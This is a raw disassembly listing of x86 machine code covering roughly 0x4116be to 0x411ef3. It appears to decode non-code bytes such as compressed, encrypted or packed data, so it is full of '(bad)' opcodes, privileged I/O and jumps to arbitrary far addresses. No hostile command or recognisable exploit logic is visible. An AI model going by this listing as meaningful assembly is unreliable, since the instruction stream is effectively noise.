  4116be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116bf:	popf   
  4116c0:	pop    es
  4116c1:	mov    cs,WORD PTR [ebx+0x56173ccf]
  4116c7:	cmc    
  4116c8:	fs push eax
  4116ca:	out    dx,al
  4116cb:	mov    dl,0x6c
  4116cd:	add    eax,0x7560203
  4116d2:	and    eax,0x7dbc4ca0
  4116d7:	mov    ds:0x292233bd,eax
  4116dc:	cdq    
  4116dd:	not    DWORD PTR [edx]
  4116df:	ins    DWORD PTR es:[edi],dx
  4116e0:	or     DWORD PTR ds:0x7771b6a3,ecx
  4116e6:	sub    BYTE PTR [ecx-0x5cae30d5],bl
  4116ec:	xchg   ebx,eax
  4116ed:	repz fcom QWORD PTR [edi-0x1e1cad96]
  4116f4:	aam    0x85
  4116f6:	cs dec esi
  4116f8:	psllw  mm5,QWORD PTR [eax]
  4116fb:	in     al,0xae
  4116fd:	div    DWORD PTR [ebp+0x3b]
  411700:	popa   
  411701:	(bad)  
  411702:	push   ss
  411703:	pop    ss
  411704:	adc    al,0x87
  411706:	test   BYTE PTR ds:0xd9305d76,dh
  41170c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170d:	int    0x42
  41170f:	and    esi,DWORD PTR [ebx]
  411711:	fld    DWORD PTR [ebp+ecx*8+0x55e52780]
  411718:	mov    al,ds:0xaf6f0330
  41171d:	inc    ebx
  41171e:	retf   
  41171f:	sbb    eax,0x6e700a2
  411724:	cmc    
  411725:	or     dl,ah
  411727:	mov    ecx,0xafe16156
  41172c:	pop    ebx
  41172d:	loope  0x411726
  41172f:	inc    ecx
  411730:	retf   
  411731:	push   ecx
  411732:	pusha  
  411733:	inc    esp
  411734:	repnz pop ss
  411736:	mov    ah,0x9f
  411738:	xlat   BYTE PTR ds:[ebx]
  411739:	inc    eax
  41173a:	add    al,0x55
  41173c:	stc    
  41173d:	enter  0xc3ec,0xa6
  411741:	and    esi,ecx
  411743:	div    DWORD PTR [edi-0x31232497]
  411749:	mov    al,0xbf
  41174b:	ret    0x7666
  41174e:	rcr    DWORD PTR [esi-0x32],1
  411751:	mov    dl,0x6b
  411753:	mov    bh,0x25
  411755:	jmp    0xa9415bf
  41175a:	push   0x3a
  41175c:	xchg   ebp,eax
  41175e:	out    0x9f,eax
  411760:	jb     0x41178a
  411762:	dec    eax
  411763:	lds    esi,FWORD PTR [ebp+0x3f]
  411766:	add    eax,0xb67f5d4
  41176b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41176c:	and    DWORD PTR [bp+0x1a14],ebx
  411771:	(bad)  
  411773:	cmp    BYTE PTR [ebp+0x2f],ch
  411776:	dec    ebx
  411777:	mov    dh,0x5
  411779:	push   ebp
  41177a:	cld    
  41177b:	gs int3 
  41177d:	js     0x4117ac
  41177f:	in     al,dx
  411780:	les    ebp,FWORD PTR [ebp-0x58]
  411783:	push   cs
  411784:	jne    0x411714
  411786:	push   edx
  411787:	mov    bl,0x33
  411789:	sub    al,0xc8
  41178b:	cmp    al,0xf0
  41178d:	push   edx
  41178e:	cs jae 0x411791
  411791:	push   0x43
  411793:	mov    edx,0xf38f2fc3
  411798:	(bad)  
  411799:	gs mov edx,0x3cb18235
  41179f:	sahf   
  4117a0:	mov    esi,ebp
  4117a2:	popa   
  4117a3:	mov    ds:0x594f0e76,al
  4117a8:	scas   al,BYTE PTR es:[edi]
  4117a9:	pop    edi
  4117aa:	das    
  4117ab:	leave  
  4117ac:	xchg   ecx,eax
  4117ad:	xor    BYTE PTR [esi+0x32],dl
  4117b0:	cmp    BYTE PTR [eax-0x16],bh
  4117b3:	lock outs dx,BYTE PTR ds:[esi]
  4117b5:	aam    0xeb
  4117b7:	dec    eax
  4117b8:	cmc    
  4117b9:	fild   WORD PTR [ebp-0x5665ba46]
  4117bf:	fdiv   QWORD PTR [esi+0x756850ba]
  4117c5:	enter  0x1803,0xf7
  4117c9:	pop    es
  4117ca:	not    BYTE PTR [edi+esi*2]
  4117cd:	xchg   ecx,eax
  4117ce:	dec    ebp
  4117cf:	or     DWORD PTR [bx+di-0x33ab],edi
  4117d4:	(bad)  
  4117d6:	imul   ebp,DWORD PTR [ebx],0x753782e1
  4117dc:	push   ss
  4117dd:	dec    ebx
  4117de:	mov    bh,0x62
  4117e0:	push   es
  4117e1:	lock mov WORD PTR [ebp-0xf4f6c44],ss
  4117e8:	jmp    0x2433:0x268f2abf
  4117ef:	rcl    BYTE PTR [ebp+0x30],1
  4117f2:	cdq    
  4117f3:	(bad)  
  4117f4:	sub    eax,0xace9e0f1
  4117f9:	mov    edx,0xf0ae8ed
  4117fe:	pop    ecx
  4117ff:	ins    BYTE PTR es:[edi],dx
  411800:	pusha  
  411801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411802:	pop    esi
  411803:	pop    ebp
  411804:	sbb    DWORD PTR ds:0x81c012cb,edi
  41180a:	xchg   edx,eax
  41180b:	adc    BYTE PTR [edx-0x48],0xcc
  41180f:	cli    
  411810:	sub    BYTE PTR [eax-0x19],ah
  411813:	jne    0x4117ca
  411815:	inc    esi
  411816:	adc    al,BYTE PTR [edx]
  411818:	jne    0x41187f
  41181a:	cmp    al,0xca
  41181c:	stc    
  41181d:	shl    DWORD PTR [edi-0x7c01258],cl
  411823:	test   DWORD PTR [eax+edx*1],eax
  411826:	mov    dh,BYTE PTR [eax+0xb229af8]
  41182c:	(bad)  
  41182d:	push   ss
  41182e:	call   0x8559c253
  411833:	cli    
  411834:	pop    edi
  411835:	or     ebx,DWORD PTR [esi]
  411837:	idiv   al
  411839:	test   eax,0x3cee280
  41183e:	jo     0x4117df
  411840:	lods   al,BYTE PTR ds:[esi]
  411841:	test   BYTE PTR [ebp-0x7bd0e32f],dl
  411847:	pushfw 
  411849:	inc    ebp
  41184a:	mov    ebp,DWORD PTR [edi-0x9]
  41184d:	jmp    0x18a7:0x973e39cb
  411854:	adc    eax,0xa2e69bc1
  411859:	fnstsw WORD PTR [edx]
  41185b:	or     al,0x46
  41185d:	div    DWORD PTR [edi-0x2b]
  411860:	or     cl,BYTE PTR [ebx-0x69eb5fe5]
  411866:	dec    eax
  411867:	mov    bh,0xfb
  411869:	cmp    eax,0xf3762c89
  41186e:	mov    dh,0x90
  411870:	leave  
  411871:	int    0x16
  411873:	clc    
  411874:	push   0x51efe169
  411879:	jb     0x4118ae
  41187b:	arpl   si,cx
  41187d:	out    0x43,al
  41187f:	ins    BYTE PTR es:[edi],dx
  411880:	lds    ecx,FWORD PTR [edx]
  411882:	ja     0x4118b2
  411884:	add    eax,0x67035ac6
  411889:	dec    edi
  41188a:	aam    0x5a
  41188c:	pop    ebx
  41188d:	retf   
  41188e:	jle    0x4118df
  411890:	dec    edi
  411891:	cmp    al,0x59
  411893:	ficomp DWORD PTR [edx+0x54]
  411896:	loope  0x41186b
  411898:	nop
  411899:	rol    DWORD PTR [edi+eiz*4-0x44c60890],cl
  4118a0:	or     eax,DWORD PTR [edx]
  4118a2:	rcr    BYTE PTR [ecx+edx*4-0x58],1
  4118a6:	xchg   ebp,eax
  4118a7:	fisttp QWORD PTR [ebp-0x64fe206c]
  4118ad:	mov    al,0xfa
  4118af:	xchg   ebx,eax
  4118b0:	dec    ecx
  4118b1:	sahf   
  4118b2:	icebp  
  4118b3:	shr    DWORD PTR [esi-0x56c020b1],0xe6
  4118ba:	mov    ah,0x7a
  4118bc:	dec    ebx
  4118bd:	test   ecx,ebp
  4118bf:	dec    ebp
  4118c0:	cmp    ebx,0x47
  4118c3:	enter  0x326f,0x56
  4118c7:	fwait
  4118c8:	nop    ebp
  4118cb:	aas    
  4118cc:	adc    ch,BYTE PTR [edx+0x16f87941]
  4118d2:	add    eax,0xc04ba6f2
  4118d7:	sbb    ah,BYTE PTR [ebx+0x7de7b167]
  4118dd:	mov    gs,WORD PTR [esi-0x3a]
  4118e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e1:	mov    bl,0xf1
  4118e3:	push   edx
  4118e4:	dec    edx
  4118e5:	xor    ch,BYTE PTR [edx]
  4118e7:	mov    ebp,0xedb51b8d
  4118ec:	xor    al,0x28
  4118ee:	adc    bh,BYTE PTR [edi+edi*2-0x72]
  4118f2:	pop    ebp
  4118f3:	int3   
  4118f4:	test   DWORD PTR fs:[esi],0x3917b591
  4118fb:	or     al,0x2a
  4118fd:	(bad)  
  4118fe:	std    
  4118ff:	sub    al,0x5d
  411901:	xchg   esi,eax
  411902:	sbb    al,0xe8
  411904:	sti    
  411905:	mov    esi,0x213d8b4
  41190a:	sbb    bl,BYTE PTR [ecx]
  41190c:	sbb    cl,al
  41190e:	in     al,dx
  41190f:	out    0x36,eax
  411911:	fiadd  DWORD PTR [esi+0x5]
  411914:	sub    esi,DWORD PTR [ebp-0x30d89690]
  41191a:	push   eax
  41191b:	push   ebp
  41191c:	sub    bl,dh
  41191e:	jb     0x4118bc
  411920:	mov    ds:0xbd1fbce8,al
  411925:	xor    DWORD PTR [ebx],0x38113dac
  41192b:	push   esp
  41192c:	push   esi
  41192d:	mov    al,0xbb
  41192f:	scas   eax,DWORD PTR es:[edi]
  411930:	inc    esi
  411931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411932:	into   
  411933:	mov    dl,0x6d
  411935:	push   ebx
  411936:	mov    cl,0x27
  411938:	daa    
  411939:	and    DWORD PTR [eax-0x3c36964d],0x4ed4d6a0
  411943:	je     0x4119b4
  411945:	mov    dl,BYTE PTR [ebx]
  411947:	mov    BYTE PTR [edx+0x3a02dfcf],ch
  41194d:	inc    esp
  41194e:	in     eax,0x25
  411950:	or     bh,cl
  411952:	shl    DWORD PTR [ebx+0x5b],1
  411955:	das    
  411956:	outs   dx,DWORD PTR ds:[esi]
  411957:	fcmovne st,st(5)
  411959:	pusha  
  41195a:	sub    al,0x9c
  41195c:	cmp    al,0xce
  41195e:	adc    al,0x82
  411960:	add    al,BYTE PTR ds:0x9ad6a946
  411966:	xchg   esi,eax
  411967:	mov    ebx,?
  411969:	add    bh,BYTE PTR [eax]
  41196b:	mov    eax,ds:0x228fcaf5
  411970:	xlat   BYTE PTR ds:[ebx]
  411971:	push   cs
  411972:	dec    edi
  411973:	(bad)  
  411974:	fisttp DWORD PTR [edi+ebx*2]
  411977:	(bad)  
  411978:	neg    DWORD PTR ds:0xf09192fd
  41197e:	test   DWORD PTR [esi+eax*1+0x35631c3b],0x7568d750
  411989:	pop    ecx
  41198a:	call   edi
  41198c:	rol    BYTE PTR [ebx-0x68],1
  41198f:	cmp    ch,BYTE PTR [ecx-0x2d]
  411992:	sub    DWORD PTR [ebx],0x2bbc3f33
  411998:	fidivr WORD PTR [esi]
  41199a:	test   al,0xaf
  41199c:	fidivr DWORD PTR [ebx+edx*4+0x3c]
  4119a0:	xor    DWORD PTR ds:0xd9b5b06e,0x3d4f3efd
  4119aa:	scas   al,BYTE PTR es:[edi]
  4119ab:	or     DWORD PTR [ecx+0x7a],0xffffff8a
  4119af:	jns    0x41196f
  4119b1:	out    dx,eax
  4119b2:	sbb    esp,esi
  4119b4:	jnp    0x41197c
  4119b6:	ins    DWORD PTR es:[edi],dx
  4119b7:	inc    edx
  4119b8:	mov    cl,BYTE PTR [eax-0x32ece473]
  4119be:	rcl    bl,0x13
  4119c1:	add    edi,DWORD PTR [edx]
  4119c3:	mov    eax,ds:0x2da04bbf
  4119c8:	sub    eax,DWORD PTR [ecx]
  4119ca:	or     al,0xae
  4119cc:	dec    ecx
  4119cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ce:	js     0x411a22
  4119d0:	mov    cl,0xb5
  4119d2:	cmp    eax,0xe5b973ba
  4119d7:	xlat   BYTE PTR ds:[ebx]
  4119d8:	sub    cl,BYTE PTR [esi-0x26]
  4119db:	aas    
  4119dc:	ret    
  4119dd:	into   
  4119de:	add    al,0xd3
  4119e0:	pop    ebp
  4119e1:	(bad)  
  4119e2:	ror    BYTE PTR [edi],1
  4119e4:	ror    BYTE PTR [edi-0x9149d0e],cl
  4119ea:	cld    
  4119eb:	leave  
  4119ec:	jnp    0x411a63
  4119ee:	test   al,bh
  4119f0:	stos   DWORD PTR es:[edi],eax
  4119f1:	pusha  
  4119f2:	adc    ebp,DWORD PTR [ecx+0x1d1fbe69]
  4119f8:	jmp    0x411a17
  4119fa:	pop    ebx
  4119fb:	mov    ah,0x5d
  4119fd:	imul   DWORD PTR [edx+0x2ad48b6d]
  411a03:	ret    
  411a04:	fnstenv [edx+0x794a99db]
  411a0a:	lods   al,BYTE PTR ds:[esi]
  411a0b:	popa   
  411a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a0e:	aad    0xc7
  411a10:	mov    edi,0x14c5d9c0
  411a15:	jo     0x4119cf
  411a17:	and    al,0x50
  411a19:	ins    DWORD PTR es:[edi],dx
  411a1a:	jae    0x411a3e
  411a1c:	jb     0x411a75
  411a1e:	cdq    
  411a1f:	test   DWORD PTR [esi+0x561c1eec],ecx
  411a25:	mov    dl,0x40
  411a27:	ins    DWORD PTR es:[edi],dx
  411a28:	lea    ecx,[ecx+0x41]
  411a2b:	loop   0x411a35
  411a2d:	ds stos DWORD PTR es:[edi],eax
  411a2f:	push   ds
  411a30:	pop    eax
  411a31:	jbe    0x411a3c
  411a33:	rcr    BYTE PTR [edi-0x45],1
  411a36:	dec    ecx
  411a37:	(bad)  
  411a39:	xlat   BYTE PTR ds:[ebx]
  411a3a:	mov    edx,0xbfa302a2
  411a3f:	arpl   bx,bx
  411a41:	arpl   WORD PTR [ebx],cx
  411a43:	rcr    DWORD PTR [di+0x4d34],1
  411a48:	enter  0xd45f,0xef
  411a4c:	xor    BYTE PTR [ebx-0x3bad6d43],bh
  411a52:	mov    bl,0xd
  411a54:	pop    esp
  411a55:	sbb    dl,0x8f
  411a58:	std    
  411a59:	xchg   esp,eax
  411a5a:	mov    esi,0xbb234a59
  411a5f:	jp     0x411a10
  411a61:	pop    ebx
  411a62:	int3   
  411a63:	or     DWORD PTR ds:0xba94233e,ebx
  411a69:	push   ebp
  411a6a:	xchg   ecx,eax
  411a6b:	rcl    ch,cl
  411a6d:	clc    
  411a6e:	(bad)  
  411a6f:	mov    ds:0x1ab9f1f6,eax
  411a74:	ja     0x411a66
  411a76:	js     0x411aa4
  411a78:	neg    eax
  411a7a:	call   0xaea1:0xe7085e6d
  411a81:	push   0xfffffff4
  411a83:	iret   
  411a84:	fild   DWORD PTR [esi+0x3a]
  411a87:	xor    ebx,DWORD PTR [esi]
  411a89:	dec    esi
  411a8a:	cmp    al,0xba
  411a8c:	mov    cl,0x36
  411a8e:	cdq    
  411a8f:	dec    ecx
  411a90:	and    eax,0x95267e9e
  411a95:	jo     0x411ac0
  411a97:	ss push edx
  411a99:	cld    
  411a9a:	cmp    BYTE PTR [edx],dh
  411a9c:	ja     0x411ae3
  411a9e:	xor    bl,dh
  411aa0:	pop    edi
  411aa1:	or     ecx,DWORD PTR [edi+0x5f52b9f0]
  411aa7:	mov    BYTE PTR [ebx-0x78f046bd],ah
  411aad:	sbb    DWORD PTR [esi],ebp
  411aaf:	xchg   esi,eax
  411ab0:	mov    ah,BYTE PTR [edx+eax*8+0x6e]
  411ab4:	fdivr  DWORD PTR [ebx-0x1a]
  411ab7:	xchg   esp,eax
  411ab8:	inc    edx
  411ab9:	icebp  
  411aba:	jmp    0x7e0db485
  411abf:	sbb    BYTE PTR [esi],ch
  411ac1:	cmp    al,0xe8
  411ac3:	test   DWORD PTR [edx],edi
  411ac5:	push   ecx
  411ac6:	or     edi,edi
  411ac8:	lahf   
  411ac9:	ret    
  411aca:	xchg   edi,eax
  411acb:	icebp  
  411acc:	and    BYTE PTR [edi-0x6092b569],0x44
  411ad3:	mov    eax,0x7a27d6e1
  411ad8:	xor    DWORD PTR [edx],esp
  411ada:	jns    0x411a6a
  411adc:	cld    
  411add:	add    al,0x3
  411adf:	in     eax,0x49
  411ae1:	(bad)  
  411ae3:	loopne 0x411b5c
  411ae5:	shl    DWORD PTR ds:0x703d58e6,0xaf
  411aec:	inc    ebx
  411aed:	stos   DWORD PTR es:[edi],eax
  411aee:	inc    esp
  411aef:	fst    QWORD PTR [edi-0x13]
  411af2:	xchg   edi,eax
  411af3:	add    cl,BYTE PTR [esi+ebx*8+0x20]
  411af7:	sub    BYTE PTR [ebp+edx*8-0x16],0x7e
  411afc:	scas   eax,DWORD PTR es:[edi]
  411afd:	loope  0x411ac4
  411aff:	retf   
  411b00:	xor    al,0x14
  411b02:	mov    ds:0xe39c3276,eax
  411b07:	mov    bl,0x1d
  411b09:	fstp   TBYTE PTR [ecx]
  411b0b:	(bad)  
  411b0c:	(bad)  
  411b0d:	mov    DWORD PTR [eax-0x73],eax
  411b10:	(bad)  
  411b11:	or     al,0xff
  411b13:	xchg   edx,eax
  411b14:	repnz sub BYTE PTR [ebx],dh
  411b17:	fdiv   st(7),st
  411b19:	les    ebx,FWORD PTR [edi+0x9]
  411b1c:	data16 (bad) 
  411b1e:	dec    ebp
  411b1f:	sbb    al,0x2b
  411b21:	cmp    al,bh
  411b23:	xchg   ebp,eax
  411b24:	sbb    DWORD PTR [edx+eiz*4],eax
  411b27:	ror    BYTE PTR [eax],cl
  411b29:	inc    eax
  411b2a:	mov    edx,0x74f256eb
  411b2f:	bswap  ebx
  411b31:	test   DWORD PTR [ecx-0x7d1b4557],esp
  411b37:	out    dx,al
  411b38:	mov    dl,ch
  411b3a:	jp     0x411ac3
  411b3c:	xor    ch,BYTE PTR [edi]
  411b3e:	fs push 0xffffffda
  411b41:	sbb    eax,0x315e10ae
  411b46:	iret   
  411b47:	aam    0x21
  411b49:	and    eax,0x3bbf303b
  411b4e:	out    dx,al
  411b4f:	in     eax,0x96
  411b51:	dec    ecx
  411b52:	inc    edx
  411b53:	fsubr  DWORD PTR [eax+0x1e4d9e97]
  411b59:	std    
  411b5a:	and    ah,BYTE PTR [esi+eax*4+0x515011ad]
  411b61:	jb     0x411b3d
  411b63:	mov    bl,0x38
  411b65:	popf   
  411b66:	or     ebx,DWORD PTR ds:0xbeebc83b
  411b6c:	push   DWORD PTR [eax-0x5f11c722]
  411b72:	add    bh,bl
  411b74:	or     bh,BYTE PTR [esi-0x15]
  411b77:	push   ds
  411b78:	test   eax,0x97a88433
  411b7d:	call   0xc7bb:0xd025d0d4
  411b84:	sub    al,0xbe
  411b86:	enter  0xe2f0,0xe1
  411b8a:	int3   
  411b8b:	inc    ecx
  411b8c:	int3   
  411b8d:	ret    
  411b8e:	sbb    BYTE PTR [edi+0x11],dl
  411b91:	and    eax,0x3c9c57a0
  411b96:	pop    ebp
  411b97:	push   esi
  411b98:	cmc    
  411b99:	jb     0x411b93
  411b9b:	sti    
  411b9c:	loopne 0x411b53
  411b9e:	xor    eax,0xdc0f5749
  411ba3:	test   BYTE PTR ds:0x5227c3be,al
  411ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411baa:	push   edx
  411bab:	lahf   
  411bac:	adc    eax,0xe54c15a
  411bb1:	mov    al,0xd2
  411bb3:	mov    ?,WORD PTR [edx+0x4b70439a]
  411bb9:	aam    0x8c
  411bbb:	mov    ah,0x3f
  411bbd:	xlat   BYTE PTR ds:[ebx]
  411bbe:	fisub  WORD PTR [esi+0x27a6838a]
  411bc4:	fstp   st(1)
  411bc6:	cs add eax,0xc305697
  411bcc:	popa   
  411bcd:	inc    ebx
  411bce:	cmp    al,BYTE PTR [ecx-0x440f70a6]
  411bd4:	fidiv  DWORD PTR [edx]
  411bd6:	aaa    
  411bd7:	cmp    esi,ebx
  411bd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bda:	sub    bl,BYTE PTR ds:0x8f4fbe92
  411be0:	sahf   
  411be1:	pop    ds
  411be2:	pop    ecx
  411be3:	pop    esi
  411be4:	jno    0x411c5a
  411be6:	push   cs
  411be7:	retf   
  411be8:	les    ebp,FWORD PTR [ebx]
  411bea:	pushf  
  411beb:	out    0x5d,al
  411bed:	or     esi,DWORD PTR [ecx+0x3459ee6b]
  411bf3:	dec    esp
  411bf4:	pop    DWORD PTR [ecx-0x5e]
  411bf7:	mov    ebp,0x207628d8
  411bfc:	xlat   BYTE PTR ds:[ebx]
  411bfd:	sub    DWORD PTR [ecx+0x675df09d],0xffffff9c
  411c04:	mov    bh,0xaa
  411c06:	mov    DWORD PTR [eax-0xd9bc6dd],edi
  411c0c:	mov    ebp,0xdc0cb594
  411c11:	daa    
  411c12:	jg     0x411bb1
  411c14:	or     eax,0xc8da3ec4
  411c19:	int    0xcd
  411c1b:	dec    eax
  411c1c:	pop    ss
  411c1d:	xor    bh,BYTE PTR [ebx+0x64]
  411c20:	jo     0x411c26
  411c22:	imul   esi,DWORD PTR [edx+0x19882bb1],0x1fb4395c
  411c2c:	into   
  411c2d:	xor    DWORD PTR [ebx-0x116dde93],edi
  411c33:	and    eax,0xa42bd3a2
  411c38:	stc    
  411c39:	std    
  411c3a:	jge    0x411c8f
  411c3c:	ja     0x411c01
  411c3e:	mov    BYTE PTR ds:0xa878dbfe,dh
  411c44:	and    DWORD PTR [ebp-0xf9e7e3],ecx
  411c4a:	push   0x30
  411c4c:	inc    ebx
  411c4d:	jb     0x411c44
  411c4f:	inc    esp
  411c50:	aam    0x2e
  411c52:	gs push esi
  411c54:	push   ds
  411c55:	fnstenv [eax-0x44ad144f]
  411c5b:	das    
  411c5c:	imul   ebp,DWORD PTR [ebx+0xb66e065],0xffffffa2
  411c63:	icebp  
  411c64:	mul    DWORD PTR [ebx-0x7d781cd8]
  411c6a:	add    eax,0xb0ec320c
  411c6f:	(bad)  [edx+0x573adbd4]
  411c75:	mov    edx,0x55695d2a
  411c7a:	and    DWORD PTR [eax],0xf0226bb9
  411c80:	and    esp,0xb553255d
  411c86:	sbb    dh,bl
  411c88:	sbb    eax,0x9da23317
  411c8d:	sub    dl,BYTE PTR [ebx+0x6debd1e6]
  411c93:	push   ss
  411c94:	in     al,0x69
  411c96:	dec    eax
  411c97:	fistp  WORD PTR [edx+0x1a]
	...
  411d12:	add    BYTE PTR [eax],al
  411d14:	sub    DWORD PTR [edx+0x41],ebx
  411d17:	sbb    dh,BYTE PTR [ebx+0x1b]
  411d1a:	jnp    0x411d97
  411d1c:	retf   0x5bc8
  411d1f:	nop
  411d20:	push   cs
  411d21:	les    esp,FWORD PTR ds:0xc6cb6c
  411d27:	add    BYTE PTR [esi+0x7],ch
  411d2a:	add    BYTE PTR [eax],al
  411d2c:	sub    eax,DWORD PTR [esi-0x15f53e8d]
  411d32:	and    BYTE PTR [ecx+0x6c],dh
  411d35:	dec    eax
  411d36:	xchg   ebp,eax
  411d37:	in     eax,dx
  411d38:	lea    edx,[ebx-0x79dd8019]
  411d3e:	fild   DWORD PTR [ebp-0x1256be1f]
  411d44:	fist   WORD PTR [ebx]
  411d46:	in     eax,0xf7
  411d48:	xor    eax,0x3d187311
  411d4d:	cmc    
  411d4e:	or     cl,bl
  411d50:	xor    esp,ecx
  411d52:	(bad)  
  411d53:	lds    esi,FWORD PTR [eax+0x34]
  411d56:	adc    dh,bl
  411d58:	retf   
  411d59:	js     0x411dcb
  411d5b:	inc    edx
  411d5c:	out    dx,eax
  411d5d:	dec    edi
  411d5e:	push   eax
  411d5f:	jmp    0x411d83
  411d61:	xchg   ebx,eax
  411d62:	add    BYTE PTR [ecx+edi*4],bl
  411d65:	pop    eax
  411d66:	pop    edi
  411d67:	cs sar bh,1
  411d6a:	sti    
  411d6b:	adc    ah,cl
  411d6d:	loop   0x411d44
  411d6f:	stos   DWORD PTR es:[edi],eax
  411d70:	js     0x411d45
  411d72:	and    esp,DWORD PTR [esi+0xb]
  411d75:	in     al,0xac
  411d77:	jae    0x411ded
  411d79:	mov    esp,0x9319df8d
  411d7e:	dec    ecx
  411d7f:	xchg   esi,eax
  411d80:	push   0x7a
  411d82:	jle    0x411dfd
  411d84:	jmp    0xf0006ba6
  411d89:	scas   al,BYTE PTR es:[edi]
  411d8a:	aam    0x42
  411d8c:	pop    ebp
  411d8d:	sar    bl,0x88
  411d90:	call   0x67c0:0x88c01dca
  411d97:	icebp  
  411d98:	aas    
  411d99:	mov    dl,0x47
  411d9b:	icebp  
  411d9c:	scas   eax,DWORD PTR es:[edi]
  411d9d:	mov    DWORD PTR [esi],ebp
  411d9f:	int3   
  411da0:	xor    dl,dh
  411da2:	in     eax,dx
  411da3:	push   ebp
  411da4:	lods   eax,DWORD PTR ds:[esi]
  411da5:	push   es
  411da6:	jmp    0x710:0x5a8fa543
  411dad:	and    DWORD PTR [ebx+0x78],esi
  411db0:	jge    0x411db2
  411db2:	cli    
  411db3:	(bad)  ds:0xdd5300b2
  411db9:	dec    eax
  411dba:	fnsave [edi-0x64]
  411dbd:	or     bl,ch
  411dbf:	shl    BYTE PTR [ebx],cl
  411dc1:	mov    bl,cl
  411dc3:	mov    al,ds:0xe62a0f9d
  411dc8:	xor    al,0x39
  411dca:	call   0x3ee814e3
  411dcf:	das    
  411dd0:	jp     0x411e3d
  411dd2:	dec    ebx
  411dd3:	xchg   DWORD PTR [edx-0x47],edx
  411dd6:	inc    esp
  411dd7:	cmp    al,0x1d
  411dd9:	sti    
  411dda:	cmp    al,0x0
  411ddc:	or     eax,0xb9d6e6f3
  411de1:	mov    esi,eax
  411de3:	pop    ss
  411de4:	sub    ah,BYTE PTR [ebx+edi*8+0x4a88ebea]
  411deb:	xor    eax,ebp
  411ded:	fisub  DWORD PTR [edx-0x19]
  411df0:	inc    ecx
  411df1:	add    al,0x86
  411df3:	mov    cl,0xb8
  411df5:	(bad)  
  411df6:	in     eax,dx
  411df7:	mov    ch,0x9
  411df9:	ftst   
  411dfb:	ret    
  411dfc:	lds    eax,FWORD PTR [edx-0x47]
  411dff:	loopne 0x411d9d
  411e01:	xor    eax,0xfd582a82
  411e06:	ins    DWORD PTR es:[edi],dx
  411e07:	add    bl,BYTE PTR [edx+ecx*4-0x728b355e]
  411e0e:	mov    eax,ds:0x6bb1396e
  411e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e14:	jmp    0x411dd0
  411e16:	sbb    esi,DWORD PTR [ebx]
  411e18:	sub    BYTE PTR [ecx],0xd
  411e1b:	xor    BYTE PTR [eax+0xca9e556],0x37
  411e22:	pusha  
  411e23:	bound  eax,QWORD PTR [edx+edx*8-0x6b]
  411e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e28:	hlt    
  411e29:	into   
  411e2a:	in     eax,0x33
  411e2c:	or     edx,edx
  411e2e:	mov    edx,0x39ac3888
  411e33:	es or  bh,ch
  411e36:	es icebp 
  411e38:	sbb    al,dl
  411e3a:	push   ss
  411e3b:	cli    
  411e3c:	mov    es,WORD PTR [edx-0x3d]
  411e3f:	repnz add esp,DWORD PTR ds:0x70adcf84
  411e46:	lock cdq 
  411e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e49:	mov    esp,0x610a6aea
  411e4e:	leave  
  411e4f:	nop
  411e50:	add    eax,0xa6130018
  411e55:	call   FWORD PTR ds:0xd8f89175
  411e5b:	push   es
  411e5c:	cmp    eax,0x67da44b5
  411e61:	inc    esp
  411e62:	fdivp  st(2),st
  411e64:	xchg   edi,eax
  411e65:	stos   DWORD PTR es:[edi],eax
  411e66:	mov    ds:0x182260d3,eax
  411e6b:	retf   
  411e6c:	inc    ebx
  411e6d:	inc    ecx
  411e6e:	push   edi
  411e6f:	inc    ebp
  411e70:	xchg   esi,eax
  411e71:	cmc    
  411e72:	xor    DWORD PTR [ebx],esi
  411e74:	(bad)  
  411e75:	ror    DWORD PTR [ebx-0x33],cl
  411e78:	ret    0x20bf
  411e7b:	add    BYTE PTR [edx],dh
  411e7d:	dec    esi
  411e7e:	xor    eax,0xc2009f6c
  411e83:	push   edi
  411e84:	sbb    BYTE PTR [edx-0xccb174c],0x17
  411e8b:	dec    BYTE PTR [ebp+0x7c026cf2]
  411e91:	jg     0x411e3d
  411e93:	inc    esi
  411e94:	push   eax
  411e95:	mov    edx,0x2088cf63
  411e9a:	ins    BYTE PTR es:[edi],dx
  411e9b:	mov    al,BYTE PTR [ecx-0x33]
  411e9e:	xchg   edx,eax
  411e9f:	clc    
  411ea0:	ins    DWORD PTR es:[edi],dx
  411ea1:	pop    ebp
  411ea2:	sar    DWORD PTR [eax-0x17b8b467],1
  411ea8:	mov    ds:0x1297faea,al
  411ead:	dec    esp
  411eae:	sbb    ebp,DWORD PTR [ebp+0x53614fe6]
  411eb4:	or     ecx,DWORD PTR [ebp+0x3]
  411eb7:	outs   dx,BYTE PTR ds:[esi]
  411eb8:	push   0xffffffa7
  411eba:	jmp    0x9139:0xe7025274
  411ec1:	pop    esp
  411ec2:	and    ecx,0xffffff88
  411ec5:	test   BYTE PTR [eax+eax*2+0x3d],bl
  411ec9:	push   ecx
  411eca:	inc    esi
  411ecb:	dec    edi
  411ecc:	xor    esi,DWORD PTR [edx]
  411ece:	mov    ds:0xc9111520,al
  411ed3:	ja     0x411f50
  411ed5:	push   es
  411ed6:	sbb    ebp,DWORD PTR [ebx+0x51]
  411ed9:	jbe    0x411e8f
  411edb:	iret   
  411edc:	in     al,0x5c
  411ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411edf:	mov    edi,edi
  411ee1:	or     BYTE PTR [edx+0x1b],bl
  411ee4:	mov    esp,0x4cb58d01
  411ee9:	aad    0x1a
  411eeb:	bound  ecx,QWORD PTR [esi-0x1a87a170]
  411ef1:	inc    ebx
  411ef2:	aas    
  411ef3:	fbstp  TBYTE PTR [ecx+0x3ca71b61]
